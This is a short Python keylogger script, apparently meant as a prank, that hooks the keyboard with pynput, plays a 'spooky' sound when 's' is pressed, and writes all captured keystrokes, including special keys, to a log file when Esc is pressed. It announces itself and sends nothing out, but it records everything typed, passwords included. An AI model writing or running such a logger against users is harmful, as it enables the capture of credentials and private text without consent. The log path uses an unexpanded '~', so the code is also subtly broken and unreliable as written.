import pynput
import pygame
import os

keystroke_count = 0

# Path to save the log file
log_file_path = "~/keylog.txt"  # Adjust the path as needed

# Initialize a list
keystrokes = []

# Initialize Pygame mixer for sound playback
pygame.mixer.init()

def play_spooky_sound():
    # Load the spooky sound file
    pygame.mixer.music.load("path_to_your_spooky_sound.mp3")  # Change to your sound file path
    pygame.mixer.music.play()
    pygame.time.delay(1000)  # Play for 1 second (or adjust as needed)

def on_press(key):
    global keystroke_count
    try:
        # Store character keys
        keystrokes.append(key.char)
        if key.char == 's':
            play_spooky_sound()  # Play spooky sound
    except AttributeError:
        # Store special keys like Space, Enter, etc.
        if key == pynput.keyboard.Key.space:
            keystrokes.append(' ')  # Add a space for space key
        elif key == pynput.keyboard.Key.enter:
            keystrokes.append('\n')  # New line for Enter key
        elif key == pynput.keyboard.Key.backspace:
            keystrokes.append('[BACKSPACE]')  # Handle backspace
        else:
            keystrokes.append(f'[{str(key)}]')  # Store other special keys

def on_release(key):
    global keystroke_count
    keystroke_count += 1  # Track the number of keystrokes
    # Stop listener if Esc is pressed
    if key == pynput.keyboard.Key.esc:
        # Write keystrokes to file
        with open(log_file_path, "a") as log_file:
            log_file.write(''.join(keystrokes) + '\n')
        print(f"Keylogger stopped! Total keystrokes: {keystroke_count}")  # Print to console
        return False

# Informative print statement at start
print("I will be watching...")

# Start the keylogger
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
